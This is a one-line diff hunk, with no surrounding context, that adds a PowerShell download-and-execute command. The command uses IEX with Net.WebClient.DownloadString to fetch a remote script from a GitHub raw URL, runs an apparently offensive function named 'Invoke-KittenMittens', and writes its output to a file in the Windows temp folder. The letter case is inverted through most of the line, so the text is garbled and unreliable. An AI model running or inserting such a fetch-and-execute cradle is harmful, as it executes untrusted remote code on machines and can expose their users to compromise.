@@ -1,0 +1,1 @@
+powershell IEX (New-Object Net.WebClient).DownloadString('HTTPS://GITHUB.COM/SIRPSYCHO/iNVOKE-kITTENMITTENS/RAW/MASTER/iNVOKE-kITTENMITTENS.PS1'); iNVOKE-kITTENMITTENS ^\> c:\\windows\\temp\\1.txt
